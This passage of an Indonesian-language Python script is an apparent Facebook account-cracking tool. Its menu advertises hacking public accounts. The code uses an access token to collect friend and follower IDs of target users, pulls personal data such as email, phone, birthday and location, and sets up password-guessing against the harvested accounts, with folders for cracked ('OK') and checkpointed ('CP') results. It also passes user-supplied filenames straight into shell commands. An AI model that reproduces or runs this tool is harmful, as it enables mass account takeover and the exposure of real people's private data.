		loka = pillow["hometown"]["name"]
		berak = pillow["id"]
	except KeyError:
		jalan(balmond+m+" Toket Kadaluarsa")
		time.sleep(0.5)
		login()
	except IOError:
		jalan(balmond+m+" Toket Kadaluarsa")
		time.sleep(0.5)
		login()
	except ConnectionError:
		jalan(balmond+m+" Lost konek")
		time.sleep(0.5)
		exit()
	print("│"+balmond+b+" Username    : "+p+hujan+" \x1b[1;95m                               ")
	print(u+"│"+balmond+b+" ID          : "+p+berak+"  \x1b[1;95m                      ")
	print(u+"│"+balmond+b+" Lokasi      : "+p+loka+' City         \x1b[1;95m           ')
	print(u+"│"+balmond+b+" Date        :"+p+" %s"%(hck)+"        \x1b[1;95m         ")
	print(u+"├─────────────────────────────────────────────────────────────")
	print(u+"├["+m+"01"+u+"]"+b+" Retas Akun Publik "+u+"ʕ"+m+"Banyak"+u+"ʔ            		    ")
	print(u+"├["+m+"02"+u+"]"+b+" Retas Akun Followers Publik \x1b[1;95m     			   ")
	print(u+"├["+m+"03"+u+"]"+b+" Retas Akun Pertemanan Publik "+u+"ʕ"+m+"Masal"+u+"ʔ    	   	    ")
	print(u+"├["+m+"04"+u+"]"+b+" Retas Akun tahun 2004/2008 "+u+"ʕ"+m+"Masal"+u+"ʔ      		    ")
	print(u+"├["+m+"05"+u+"]"+b+" Retas Akun tahun 2004/2010 "+u+"ʕ"+m+"Masal"+u+"ʔ      		    ")
	print(u+"│")
	print(u+"├["+m+"06"+u+"]"+p+" MODE \x1b[1;91mTarget       \x1b[1;95m     				   ")
	print(u+"│")
	print(u+"├["+m+"07"+u+"]"+b+" Retas Data Target \x1b[1;94m      		    ")
	print(u+"├["+m+"08"+u+"]"+p+" Cek Result Crack\x1b[1;94m       		     ")
	print(u+"├["+m+"09"+u+"]"+p+" Ganti tema\x1b[1;94m      		     ")
	print(u+"├["+m+"10"+u+"]"+p+" Cek opsi Hasil Crack "+s+"("+h+"ok"+s+"/"+k+"cp"+s+")\x1b[1;94m       	   ")
	print(u+"├["+m+"11"+u+"]"+p+" Setting User Agent \x1b[1;94m     		        ")
	jalan(u+"├["+m+"12"+u+"]"+k+" Tentang Author\x1b[1;94m         		         ")
	print(u+"├["+m+"00"+u+"]"+m+" Hapus Token\x1b[1;94m          				")
	print(u+"└─────────────────────────────────────────────────────────────")
	Dela_Sayang_Usup = input(balmond+l+"\x1b[1;97m Pilih : \x1b[1;91m")
	if Dela_Sayang_Usup=="1" or Dela_Sayang_Usup=="01":
		jalan ("\x1b[1;97mIklan dulu Bree :v"),time.sleep(1)
		os.system("xdg-open https://youtu.be/6tTX5ACy_Js")
		publik()
	elif Dela_Sayang_Usup=="12":
		Author()
	elif Dela_Sayang_Usup=="2" or Dela_Sayang_Usup=="02":
		follow()
	elif Dela_Sayang_Usup=="3" or Dela_Sayang_Usup=="03":
		massal()
	elif Dela_Sayang_Usup=="4" or Dela_Sayang_Usup=="04":
		jalan ("\x1b[1;97mIklan dulu Bree :v"),time.sleep(1)
		os.system("xdg-open https://youtu.be/LtIUQD_f0DA")
		dump_old()
	elif Dela_Sayang_Usup=="5" or Dela_Sayang_Usup=="05":
		jalan ("\x1b[1;97mIklan dulu Bree :v"),time.sleep(1)
		os.system("xdg-open https://youtu.be/LwtG_MpmfOA")
		dump_old2()
	elif Dela_Sayang_Usup=="6" or Dela_Sayang_Usup=="06":
		jalan ("\x1b[1;97mIKLAN dulu Bree :v"),time.sleep(1)
		os.system("xdg-open https://youtu.be/zxhviF8Nqkc")
		Target()
	elif Dela_Sayang_Usup=="11" or Dela_Sayang_Usup=="011":
		user_agent()
	elif Dela_Sayang_Usup=="10" or Dela_Sayang_Usup=="010":
		cek_opsi()
	elif Dela_Sayang_Usup=="8" or Dela_Sayang_Usup=="08":
		result()
	elif Dela_Sayang_Usup=="9" or Dela_Sayang_Usup=="09":
		tema()
	elif Dela_Sayang_Usup=="7" or Dela_Sayang_Usup=="07":
		GetData()
	elif Dela_Sayang_Usup=="0" or Dela_Sayang_Usup=="00":
		os.system("rm -rf .token.txt")
		jalan(balmond+l+" Thanks "+s+hujan+l+"Udah Pake Tools Gua Der :)")
		time.sleep(0.5)
		exit()
	else:
		jalan("\n"+balmond+m+" "+Dela_Sayang_Usup+p+" Gada di menu tod")
		time.sleep(1)
		menu()
# McybearX

def Author():
	print (u+"ʕ"+m+"1"+u+"ʔ"+p+" Join Group Whatsapp")
	print (u+"ʕ"+m+"2"+u+"ʔ"+p+" Youtube me")
	print (u+"ʕ"+m+"3"+u+"ʔ"+p+" Facebook me")
	print (u+"ʕ"+m+"4"+u+"ʔ"+p+" Lapor BUG ")
	print (u+"ʕ"+m+"0"+u+"ʔ"+p+" Kembali ke Menu Utama")
	abang = input(p+"Lipih :"+m+" ")
	if abang=="1":
		os.system("xdg-open https://chat.whatsapp.com/BS6l4dCa9aC8TQ46wB8W06")
	elif abang=="2":
		os.system("xdg-open https://youtube.com/c/MBEWLEGS")
	elif abang=="3":
		os.system("xdg-open https://www.facebook.com/profile.php?id=100074600334850")
	elif abang=="4":
		os.system("xdg-open https://wa.me/message/W6SGKZIPOZ5WJ1")
	elif abang=="0":
		menu()
	else :
		Author()
# Target

def Target():
        try:
                token = open(".token.txt","r").read()
        except IOError:
                jalan(balmond+m+" Token Kadaluarsa")
                time.sleep(0.5)
                login()
        uid=input("\x1b[1;97mMasukan id Target :\x1b[1;96m ")
        try:
                        asu = requests.get("https://graph.facebook.com/"+uid+"?access_token="+token)
                        tulul = json.loads(asu.text)
                        pea = tulul["name"]
                        print(balmond+l+" Nama : "+tulul["name"])
                        id.append(uid+"|"+pea)
        except KeyError:
                        print(balmond+m+" ID Salah")
                        time.sleep(0.5)
                        exit()
        except requests.exceptions.ConnectionError:
                        jalan(balmond+m+" Tidak Ada Internet")
                        time.sleep(0.5)
                        exit()
        print ("Ada %s Target"%len(id))
        mode_passTarget()

# Retas data

def GetData():
    try:
        token = open(".token.txt","r").read()
    except IOError:
        jalan(balmond+m+" Token Kadaluarsa")
        time.sleep(0.5)
        login()
    try:
        user = input ( "\033[0;35mʕ\x1b[1;91m ×\x1b[1;95m_\x1b[1;91m×\x1b[1;95mʔ\033[0;00m Id Target : ")
        if user == '':
            print ( " \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Masukan dengan benar bro");GetData()
#        url = ("https://lookup-id.com/")
#        if user == "facebook":
#            payload = {"fburl": user, "check": "Lookup"}
#        else:
#            payload = {"fburl": "https://free.facebook.com/" + user, "check": "Lookup"}
#        halaman = requests.post(url, data = payload).text
#        sop_ = BeautifulSoup(halaman, "html.parser")
#        email_ = user
        idt = user
        if user == "me":
            idt = "me"
        cintaku = requests.get('https://graph.facebook.com/'+idt+'?access_token='+token)
        x = json.loads(cintaku.text)
        nmaa = x['name']
    except (KeyError,IOError):
        nmaa = ('-')
    print ('\x1b[1;91m──────────────────────────────────────────────────────────────')
    print (' \x1b[1;96m  Informasi Akun ');time.sleep(0.03)
    print ('\n \033[0;35mʕ\x1b[1;91m ×\x1b[1;95m_\x1b[1;91m×\x1b[1;95mʔ\x1b[1;97m nama lengkap : '+nmaa);time.sleep(0.03)
    try:
        ndpn = x['first_name']
    except (KeyError,IOError):
        ndpn = ('-')
    print (' \033[0;35mʕ\x1b[1;91m ×\x1b[1;95m_\x1b[1;91m×\x1b[1;95mʔ\x1b[1;97m nama depan   : %s'%ndpn);time.sleep(0.03)
    try:
        nmbl = x['last_name']
    except (KeyError,IOError):
        nmbl = '-'
    print (' \033[0;35mʕ\x1b[1;91m ×\x1b[1;95m_\x1b[1;91m×\x1b[1;95mʔ\x1b[1;97m nama belakang: %s'%nmbl);time.sleep(0.03)
    try:
        hwhs = x['username']
    except (KeyError,IOError):
        hwhs = '-'
    print (' \033[0;35mʕ\x1b[1;91m ×\x1b[1;95m_\x1b[1;91m×\x1b[1;95mʔ\x1b[1;97m username fb  : '+hwhs);time.sleep(0.03)
    try:
        ___xxz___jeeck___ = x['id']
    except (KeyError,IOError):
        ___xxz___jeeck___ = '?'
    print (' \033[0;35mʕ\x1b[1;91m ×\x1b[1;95m_\x1b[1;91m×\x1b[1;95mʔ\x1b[1;97m id facebook  : %s'%___xxz___jeeck___);time.sleep(0.03)
    print ('\x1b[1;91m──────────────────────────────────────────────────────────────')
    print ('\x1b[1;96m   Data-Data Akun  \n');time.sleep(0.03)
    try:
        emai = x['email']
    except (KeyError,IOError):
        emai = '-'
    print (' \033[0;35mʕ\x1b[1;91m ×\x1b[1;95m_\x1b[1;91m×\x1b[1;95mʔ\x1b[1;97m gmail facebook : %s'%emai);time.sleep(0.03)
    try:
        nmrr = x['mobile_phone']
    except (KeyError,IOError):
        nmrr = '-'
    print (' \033[0;35mʕ\x1b[1;91m ×\x1b[1;95m_\x1b[1;91m×\x1b[1;95mʔ\x1b[1;97m nomor telepon  : %s'%nmrr);time.sleep(0.03)
    try:
        ttll = x['birthday']
    except (KeyError,IOError,NameError):
        ttll = '-/-/-'
    print (' \033[0;35mʕ\x1b[1;91m ×\x1b[1;95m_\x1b[1;91m×\x1b[1;95mʔ\x1b[1;97m tanggal lahir  : %s '%ttll);time.sleep(0.03)
    try:
        jenis = x['gender'].replace("female","Betina").replace("male","Jantan")
    except (KeyError,IOError):
        jenis = '-'
    print (' \033[0;35mʕ\x1b[1;91m ×\x1b[1;95m_\x1b[1;91m×\x1b[1;95mʔ\x1b[1;97m jenis kelamin  : %s '%jenis)
    try:
        r = requests.get('https://graph.facebook.com/'+idt+'/friends?limit=10000&access_token='+token)
        z = json.loads(r.text)
        for i in z["data"]:
            try:
               jamet = i["id"]
               id.append(jamet)
            except:
               continue
    except:
        pass
    print (' \033[0;35mʕ\x1b[1;91m ×\x1b[1;95m_\x1b[1;91m×\x1b[1;95mʔ\x1b[1;97m Total pertemnan: %s'%(len(id)))
    try:
        b = requests.get('https://graph.facebook.com/'+idt+'/subscribers?access_token='+token)
        A = json.loads(b.text)
        pengikut = A["summary"]["total_count"]
    except (KeyError, IOError):
        pengikut = '-'
    print (' \033[0;35mʕ\x1b[1;91m ×\x1b[1;95m_\x1b[1;91m×\x1b[1;95mʔ\x1b[1;97m Total pengikut : %s'%pengikut)
    try:
        lins = x['link']
    except (KeyError,IOError):
        lins = '-'
    print (' \033[0;35mʕ\x1b[1;91m ×\x1b[1;95m_\x1b[1;91m×\x1b[1;95mʔ\x1b[1;97m link facebook  : %s'%lins);time.sleep(0.03)
    try:
        stas = x['relationship_status']
    except (TypeError,KeyError,IOError):
        stas = '-'
    try:
        dgn = x['significant_other']['name']
    except (TypeError,KeyError,IOError):
        dgn = '-'
    except:
        pass
    print (' \033[0;35mʕ\x1b[1;91m ×\x1b[1;95m_\x1b[1;91m×\x1b[1;95mʔ\x1b[1;97m status hubungan: '+stas+' dengan '+dgn);time.sleep(0.03)
    try:
        bioo = x['about']
    except (KeyError,IOError):
        bioo = '-'
    except:
        pass
    print (' \033[0;35mʕ\x1b[1;91m ×\x1b[1;95m_\x1b[1;91m×\x1b[1;95mʔ\x1b[1;97m tentang status : %s'%bioo);time.sleep(0.03)
    try:
        dari = x['hometown']['name']
    except (KeyError,IOError):
        dari = '-'
    except:
        pass
    print (' \033[0;35mʕ\x1b[1;91m ×\x1b[1;95m_\x1b[1;91m×\x1b[1;95mʔ\x1b[1;97m kota asal      : %s'%dari)
    try:
        tigl = x['location']['name']
    except (KeyError,IOError):
        tigl = '-'
    except:
        pass
    print (' \033[0;35mʕ\x1b[1;91m ×\x1b[1;95m_\x1b[1;91m×\x1b[1;95mʔ\x1b[1;97m tinggal di     : %s'%tigl)
    try:
        lopeDela = x["location"]["id"]
    except (KeyError,IOError):
        lopeDela = '-'
    except:
        pass
    print (' \033[0;35mʕ\x1b[1;91m ×\x1b[1;95m_\x1b[1;91m×\x1b[1;95mʔ\x1b[1;97m id lokasi      : %s'%lopeDela)
    try:
        tzim = x['timezone']
    except (KeyError,IOError):
        tzim = '-'
    except:
        pass
    print (' \033[0;35mʕ\x1b[1;91m ×\x1b[1;95m_\x1b[1;91m×\x1b[1;95mʔ\x1b[1;97m zona waktu     : %s'%tzim);time.sleep(0.03)
    try:
        jam  = x['updated_time'][11:19]
        uptd = x['updated_time'][:10]
        year, month, day = uptd.split("-")
        month = bulan_ttl[month]
    except (KeyError,IOError):
        year = '-'
        month = '-'
        day = '-'
    except:
        pass
    print (" \033[0;35mʕ\x1b[1;91m ×\x1b[1;95m_\x1b[1;91m×\x1b[1;95mʔ Terakhir Online Tanggal \x1b[1;97m"+uptd+"\x1b[1;95m Jam \x1b[1;97m"+jam)
    print ('\x1b[1;97m──────────────────────────────────────────────────────────────')
    input('\n\x1b[1;95m  [ \x1b[1;97mKEMBALI \x1b[1;95m] ')
    menu()

# TEMA

def tema():
	print(s+"\n{"+m+"1"+s+"}"+l+" Tema Default")
	print(s+"{"+m+"2"+s+"}"+l+" Tema Kuning "+k+"{tai}")
	print(s+"{"+m+"3"+s+"}"+l+" Tema Merah "+m+"{amarah}")
	print(s+"{"+m+"4"+s+"}"+l+" Tema Biru "+s+"{langit}")
	print(s+"{"+m+"0"+s+"}"+l+" Kembali")
	pilih = input("\n"+balmond+l+" Pilih : ")
	if pilih=="1" or pilih=="01":
		awm = open(".tema.txt","w");awm.write("default");awm.close()
		print("\n"+balmond+l+" Tema Berhasil Diterapkan")
		jalan(balmond+l+" Jalankan Ulang Scriptnya...")
		time.sleep(0.5)
		exit()
	elif pilih=="2" or pilih=="02":
		awm = open(".tema.txt","w");awm.write("kuning");awm.close()
		print("\n"+balmond+l+" Tema Berhasil Diterapkan")
		jalan(balmond+l+" Jalankan Ulang Scriptnya...")
		time.sleep(0.5)
		exit()
	elif pilih=="3" or pilih=="03":
		awm = open(".tema.txt","w");awm.write("merah");awm.close()
		print("\n"+balmond+l+" Tema Berhasil Diterapkan")
		jalan(balmond+l+" Jalankan Ulang Scriptnya...")
		time.sleep(0.5)
		exit()
	elif pilih=="4" or pilih=="04":
		awm = open(".tema.txt","w");awm.write("biru");awm.close()
		print("\n"+balmond+l+" Tema Berhasil Diterapkan")
		jalan(balmond+l+" Jalankan Ulang Scriptnya...")
		time.sleep(0.5)
		exit()
	elif pilih=="0" or pilih=="00":
		menu()
	else:
		jalan(balmond+m+" Pilihan Salah")
		time.sleep(0.5)
		tema()

# RESULT

def result():
	print(s+"\n{"+m+"1"+s+"}"+l+" Cek Result CP "+k+"{akun sesi}")
	print(s+"{"+m+"2"+s+"}"+l+" Cek Result OK "+k+"{akun terbuka}")
	print(s+"{"+m+"0"+s+"}"+l+" Kembali")
	pilih = input("\n"+balmond+l+" Pilih : ")
	if pilih=="1" or pilih=="01":
		try:
			lisaa = os.listdir("Hasil_Cp")
		except FileNotFoundError:
			jalan(balmond+m+" Direktori Tidak Ditemukan")
			time.sleep(0.5)
			menu()
		if len(lisaa)==0:
			print("\n"+balmond+k+" Hasil CP")
			print(balmond+m+" Tidak Ada Hasil Cp")
			input(balmond+l+" Kembali")
			time.sleep(0.5)
			menu()
		else:
			print("\n"+balmond+l+" Hasil CP")
			for jisoo in lisaa:
				print(balmond+l+" "+jisoo)
			marjan = input(balmond+l+" File : "+h+"")
			try:
				binatang = open("Hasil_Cp/%s"%(marjan))
			except IOError:
				jalan(balmond+l+" Nama File Tidak Ada")
				time.sleep(0.5)
				menu()
		print(""+l)
		bilur = os.system("cd Hasil_Cp && cat %s"%(marjan))
		input("\n"+balmond+l+" Kembali")
		time.sleep(0.5)
		menu()
	elif pilih=="2" or pilih=="02":
		try:
			lisaa = os.listdir("Hasil_Ok")
		except FileNotFoundError:
			jalan(balmond+m+" Direktori Tidak Ditemukan")
			time.sleep(0.5)
			menu()
		if len(lisaa)==0:
			print("\n"+balmond+l+" Hasil Ok")
			print(balmond+m+" Tidak Ada Hasil Ok")
			input(balmond+l+" Kembali")
			time.sleep(0.5)
			menu()
		else:
			print("\n"+balmond+l+" Hasil Ok")
			for jisoo in lisaa:
				print(balmond+l+" "+jisoo)
			marjan = input(balmond+l+" File : "+h+"")
			try:
				binatang = open("Hasil_Ok/%s"%(marjan))
			except IOError:
				jalan(balmond+l+" Nama File Tidak Ada")
				time.sleep(0.5)
				menu()
		print(""+l)
		bilur = os.system("cd Hasil_Ok && cat %s"%(marjan))
		input("\n"+balmond+l+" Kembali")
		time.sleep(0.5)
		menu()
	elif pilih=="0" or pilih=="00":
		menu()
	else:
		jalan("\n"+balmond+m+" Tidak ada pilihan")
		time.sleep(0.5)
		result()

# USER AGENT

def user_agent():
	print(u+"\nʕ"+m+"1"+u+"ʔ"+p+" Ganti User Agent")
	print(u+"ʕ"+m+"2"+u+"ʔ"+p+" Reset User Agent")
	print(u+"ʕ"+m+"3"+u+"ʔ"+p+" Cek User Agent")
	print(u+"ʕ"+m+"4"+u+"ʔ"+p+" Pakai User Agent Hp Kamu")
	pilih = input("\n"+balmond+l+" pilih : ")
	if pilih=="1" or pilih=="01":
		user = input("\n"+balmond+p+" Masukkan User Agent : "+h+"")
		tulis = open("user.txt","w");tulis.write(user);tulis.close()
		jalan(balmond+h+" Berhasil")
		time.sleep(0.5)
		menu()
	elif pilih=="2" or pilih=="02":
		user = "Mozilla/5.0 (Linux; Android 9; Mi Note 10 Build/PKQ1.190302.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4577.82 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/335.0.0.28.118;]"
		tulis = open("user.txt","w");tulis.write(user);tulis.close()
		jalan("\n"+balmond+h+" Berhasil")
		time.sleep(0.5)
		menu()
	elif pilih=="3" or pilih=="03":
		try:
			user = open("user.txt","r").read()
		except IOError:
			jalan("\n"+balmond+m+" File User Agent Tidak Ada, Silahkan Setting Terlebih Dahulu")
			time.sleep(0.5)
			menu()
		print("\n"+balmond+l+" User Agent : "+h+user)
		input(balmond+l+" Kembali")
		menu()
	elif pilih=="4" or pilih=="04":
		MBEW('\n  Anda Akan di arahkan ke browser,nantinya Anda tinggal\n     Menyalin text setelah kata "+ User-Agent Anda : " Lalu Tempelkan disini' );time.sleep(1)
		os.system("xdg-open https://myuseragent.herokuapp.com")
		buser = input("\n"+balmond+p+" Masukkan User Agent : "+h+"")
		sulis = open("user.txt","w");sulis.write(buser);sulis.close()
		jalan(balmond+h+" Berhasil Mengganti User Agent 🤪")
		time.sleep(0.5)
		menu()
	else:
		jalan("\n"+balmond+m+" Pilihan Yang Bener Tod")
		time.sleep(0.5)
		user_agent()

# Old2

def dump_old2():
        try:
                token = open(".token.txt","r").read()
        except IOError:
                jalan(balmond+m+" Token Kadaluarsa")
                time.sleep(0.5)
                login()
        old_gak.append("old")
        try:
                nada = int(input("\n"+balmond+l+" Mau Dump Berapa target : "))
                if nada>10:
                        jalan(balmond+m+" Maksimal 10 target")
                        time.sleep(0.5)
                        dump_old2()
        except ValueError:
                jalan(balmond+m+" Input Invalid")
                time.sleep(0.5)
                dump_old2()
        for dot in range(nada):
                dot+=1
                tampung = []
                non_old = []
                uid = input(balmond+l+" Masukkan ID Target ke %s : "%(dot))
                try:
                        asu = requests.get("https://graph.facebook.com/"+uid+"?access_token="+token)
                        tulul = json.loads(asu.text)
                        print(balmond+l+" Nama : "+tulul["name"])
                except KeyError:
                        print(balmond+m+" ID Salah")
                        time.sleep(0.5)
                        exit()
                except requests.exceptions.ConnectionError:
                        jalan(balmond+m+" Tidak Ada Internet")
                        time.sleep(0.5)
                        exit()
                try:
                        bulu = requests.get("https://graph.facebook.com/"+uid+"/friends?limit=10000&access_token="+token)
                        buriq = json.loads(bulu.text)
                        for cew in buriq["data"]:
                                try:
                                        jamet = cew["id"]
                                        junet = cew["name"]
                                        non_old.append(jamet+"|"+junet)
                                        detec = jamet+"|"+junet
                                        if detec in id:
                                                continue
                                        else:
                                                if len(jamet)==6 or len(jamet)==7 or len(jamet)==8:
                                                        id.append(jamet+"|"+junet)
                                                        tampung.append(jamet+"|"+junet)
                                                        well = open("id.txt","a");well.write(jamet+"\n");well.close()
                                                elif len(jamet)==9:
                                                        id.append(jamet+"|"+junet)
                                                        tampung.append(jamet+"|"+junet)
                                                        well = open("id.txt","a");well.write(jamet+"\n");well.close()
                                                elif len(jamet)==10 and jamet[0]=="1":
                                                        if jamet[1]=="0" or jamet[1]=="1":
                                                                if jamet[2]=="0" or jamet[2]=="1" or jamet[2]=="2":
                                                                        id.append(jamet+"|"+junet)
                                                                        tampung.append(jamet+"|"+junet)
                                                                        well = open("id.txt","a");well.write(jamet+"\n");well.close()
                                                                else:continue
                                                        else:continue
                                                elif len(jamet)==15 and jamet[4]=="0":
                                                        if jamet[5]=="0":
                                                                if jamet[6]=="0" or jamet[6]=="1" or jamet[6]=="2" or jamet[6]=="3" or jamet[6]=="4" or jamet[6]=="5" or jamet[6]=="6" or jamet[6]=="7" or jamet[6]=="8":
                                                                        id.append(jamet+"|"+junet)
                                                                        tampung.append(jamet+"|"+junet)
                                                                        well = open("id.txt","a");well.write(jamet+"\n");well.close()
                                                                else:continue
                                                        else:continue
                                                else:
                                                        continue
                                except:
                                        continue
                        print(balmond+l+" Total ID : "+h+"%s"%(len(non_old)))
                        print(balmond+l+" Total ID Old : "+h+"%s\n"%(len(tampung)))
                except requests.exceptions.ConnectionError:
                        jalan(balmond+m+" Tidak Ada Internet")
                        time.sleep(0.5)
                        exit()
        print(balmond+l+" Jumlah Total ID Old : "+h+"%s"%(len(id)))
        os.system("rm -rf id.txt")
        mode_password()

# OLD

def dump_old():
        try:
                token = open(".token.txt","r").read()
        except IOError:
                jalan(balmond+m+" Token Kadaluarsa")
                time.sleep(0.5)
                login()
        old_gak.append("old")
        try:
                nada = int(input("\n"+balmond+l+" Mau Dump Berapa Target : "))
                if nada>10:
                        jalan(balmond+m+" Maksimal 10 Target")
                        time.sleep(0.5)
                        dump_old()
        except ValueError:
                jalan(balmond+m+" Input Invalid")
                time.sleep(0.5)
                dump_old()
        for dot in range(nada):
                dot+=1
                tampung = []
                non_old = []
                uid = input(balmond+l+" Masukkan ID Target Ke %s : "%(dot))
                try:
                        asu = requests.get("https://graph.facebook.com/"+uid+"?access_token="+token)
                        tulul = json.loads(asu.text)
                        print(balmond+l+" Nama : "+tulul["name"])
                except KeyError:
                        print(balmond+m+" ID Salah")
                        time.sleep(0.5)
                        exit()
                except requests.exceptions.ConnectionError:
                        jalan(balmond+m+" Tidak Ada Internet")
                        time.sleep(0.5)
                        exit()
                try:
                        bulu = requests.get("https://graph.facebook.com/"+uid+"/friends?limit=10000&access_token="+token)
                        buriq = json.loads(bulu.text)
                        for cew in buriq["data"]:
                                try:
                                        jamet = cew["id"]
                                        junet = cew["name"]
                                        non_old.append(jamet+"|"+junet)
                                        detec = jamet+"|"+junet
                                        if detec in id:
                                                continue
                                        else:
                                                if len(jamet)==6 or len(jamet)==7 or len(jamet)==8:
                                                        id.append(jamet+"|"+junet)
                                                        tampung.append(jamet+"|"+junet)
                                                        well = open("id.txt","a");well.write(jamet+"\n");well.close()
                                                elif len(jamet)==9:
                                                        id.append(jamet+"|"+junet)
                                                        tampung.append(jamet+"|"+junet)
                                                        well = open("id.txt","a");well.write(jamet+"\n");well.close()
                                                elif len(jamet)==10 and jamet[0]=="1":
                                                        if jamet[1]=="0" or jamet[1]=="1":
                                                                if jamet[2]=="0" or jamet[2]=="1" or jamet[2]=="2":
                                                                        id.append(jamet+"|"+junet)
                                                                        tampung.append(jamet+"|"+junet)
                                                                        well = open("id.txt","a");well.write(jamet+"\n");well.close()
                                                                else:continue
                                                        else:continue
                                                else:
                                                        continue
                                except:
                                        continue
                        print(balmond+l+" Total ID : "+h+"%s"%(len(non_old)))
                        print(balmond+l+" Total ID Old : "+h+"%s\n"%(len(tampung)))
                except requests.exceptions.ConnectionError:
                        jalan(balmond+m+" Tidak Ada Internet")
                        time.sleep(0.5)
                        exit()
        print(balmond+l+" Jumlah Total ID Old : "+h+"%s"%(len(id)))
        os.system("rm -rf id.txt")
        mode_password()

# PUBLIK

def publik():
	try:
		token = open(".token.txt","r").read()
	except IOError:
		jalan(balmond+m+" Token Kadaluarsa")
		time.sleep(0.5)
		login()
	uid = input("\n"+balmond+l+" Masukkan ID Target : ")
	try:
		asu = requests.get("https://graph.facebook.com/"+uid+"?access_token="+token)
		tulul = json.loads(asu.text)
		print(balmond+l+" Nama : "+tulul["name"])
	except KeyError:
		print(balmond+m+" ID Salah")
		time.sleep(0.5)
		publik()
	except requests.exceptions.ConnectionError:
		jalan(balmond+m+" Tidak Ada Internet")
		time.sleep(0.5)
		exit()
	try:
		bulu = requests.get("https://graph.facebook.com/"+uid+"/friends?limit=10000&access_token="+token)
		buriq = json.loads(bulu.text)
		for cew in buriq["data"]:
			try:
				jamet = cew["id"]
				junet = cew["name"]
				id.append(jamet+"|"+junet)
			except:
				continue
		print(balmond+l+" Total ID : "+h+"%s"%(len(id)))
		mode_password()
	except requests.exceptions.ConnectionError:
		jalan(balmond+m+" Tidak Ada Internet")
		time.sleep(0.5)
		exit()

# FOLLOW

def follow():
	try:
		token = open(".token.txt","r").read()
	except IOError:
		jalan(balmond+m+" Token Kadaluarsa")
		time.sleep(0.5)
		login()
	uid = input("\n"+balmond+l+" Masukkan ID Target : ")
	try:
		jumlah = int(input(balmond+l+" Mau Ambil Berapa ID : "))
		if jumlah>5000:
			jalan(balmond+m+" Maksimal 5000 ID")
			time.sleep(0.5)
			follow()
	except ValueError:
		jalan(balmond+m+" Input Invalid")
		time.sleep(0.5)
		follow()
	try:
		asu = requests.get("https://graph.facebook.com/"+uid+"?access_token="+token)
		tulul = json.loads(asu.text)
		print(balmond+l+" Nama : "+tulul["name"])
	except KeyError:
		print(balmond+m+" ID Salah")
		time.sleep(0.5)
		follow()
	except requests.exceptions.ConnectionError:
		jalan(balmond+m+" Tidak Ada Internet")
		time.sleep(0.5)
		exit()
	try:
		bulu = requests.get("https://graph.facebook.com/"+uid+"/subscribers?limit="+str(jumlah)+"&access_token="+token)
		buriq = json.loads(bulu.text)
		for cew in buriq["data"]:
			try:
				jamet = cew["id"]
				junet = cew["name"]
				id.append(jamet+"|"+junet)
			except:
				continue
		print(balmond+l+" Total ID : "+h+"%s"%(len(id)))
		mode_password()
	except requests.exceptions.ConnectionError:
		jalan(balmond+m+" Tidak Ada Internet")
		time.sleep(0.5)
		exit()

# MASSAL

def massal():
	try:
		token = open(".token.txt","r").read()
	except IOError:
		jalan(balmond+m+" Token Kadaluarsa")
		time.sleep(0.5)
		login()
	try:
		nada = int(input("\n"+balmond+l+" Mau Dump Berapa Target : "))
		if nada>10:
			jalan(balmond+m+" Maksimal 10 Target")
			time.sleep(0.5)
			massal()
	except ValueError:
		jalan(balmond+m+" Input Invalid")
		time.sleep(0.5)
		massal()
	for dot in range(nada):
		dot+=1
		tampung = []
		uid = input(balmond+l+" Masukkan ID Target Ke %s : "%(dot))
		try:
			asu = requests.get("https://graph.facebook.com/"+uid+"?access_token="+token)
			tulul = json.loads(asu.text)
			print(balmond+l+" Nama : "+tulul["name"])
		except KeyError:
			print(balmond+m+" ID Salah")
			time.sleep(0.5)
			exit()
		except requests.exceptions.ConnectionError:
			jalan(balmond+m+" Tidak Ada Internet")
			time.sleep(0.5)
			exit()
		try:
			bulu = requests.get("https://graph.facebook.com/"+uid+"/friends?limit=10000&access_token="+token)
			buriq = json.loads(bulu.text)
			for cew in buriq["data"]:
				try:
					jamet = cew["id"]
					junet = cew["name"]
					detec = jamet+"|"+junet
					if detec in id:
						continue
					else:
						id.append(jamet+"|"+junet)
						tampung.append(jamet+"|"+junet)
				except:
					continue
			print(balmond+l+" Total ID : "+h+"%s\n"%(len(tampung)))
		except requests.exceptions.ConnectionError:
			jalan(balmond+m+" Tidak Ada Internet")
			time.sleep(0.5)
			exit()
	print(balmond+l+" Jumlah Total ID : "+h+"%s"%(len(id)))
	mode_password()

# MODE PASSWORD

def mode_passTarget():
        mode = input("\n"+balmond+l+" Masukan Password Tambahan Sebanyak-banyaknya!!! ?"+s+"\n      {"+u+"ENTER"+s+"}")
        if mode=="" or mode=="":
                print("\n"+balmond+l+" Masukkan Password Tambahan")
                print(balmond+l+" Miniman 6 Karakter Dalam 1 Password")
                print(balmond+l+" Contoh : "+k+"sayang,bismillah,katasandi")
                pwa = input(balmond+l+" Password Tambahan : "+h+"")
                cewe = pwa.split(",")
                if len(cewe)>100:
                        jalan("\n"+balmond+m+" Jangan Serakah Ngab, Maksimal 100 Password Aja")
                        time.sleep(0.5)
                        mode_passTarget()
                for cowok in cewe:
                        if len(cowok)==1 or len(cowok)==2 or len(cowok)==3 or len(cowok)==4 or len(cowok)==5:
                                jalan("\n"+balmond+m+" Dalam 1 Password Minimal 6 Karakter")
                                time.sleep(0.5)
                                mode_passTarget()
                sandi.append(pwa)
                opsi3()
        else:
                jalan(balmond+m+" Tekan Enter ngaab")
                time.sleep(0.5)
                mode_passTarget()

def mode_password():
	mode = input("\n"+balmond+l+" Pakai Password Default/Manual/Gabungan ? "+s+"\n      {"+u+"D/M/G"+s+"}"+l+" : ")
	if mode=="d" or mode=="D":
		opsi()
	elif mode=="m" or mode=="M":
		print("\n"+balmond+l+" Masukkan Password Manual")
		print(balmond+l+" Miniman 6 Karakter Dalam 1 Password")
		print(balmond+l+" Contoh : "+k+"sayang,bismillah,katasandi")
		pwa = input(balmond+l+" Password Manual : "+h+"")
		cewe = pwa.split(",")
		if len(cewe)>7:
			jalan("\n"+balmond+m+" Jangan Serakah ngab, Minimal 7 Password Aja")
			time.sleep(0.5)
			mode_password()
		for cowok in cewe:
			if len(cowok)==1 or len(cowok)==2 or len(cowok)==3 or len(cowok)==4 or len(cowok)==5:
				jalan("\n"+balmond+m+" Dalam 1 Password Minimal 6 Karakter")
				time.sleep(0.5)
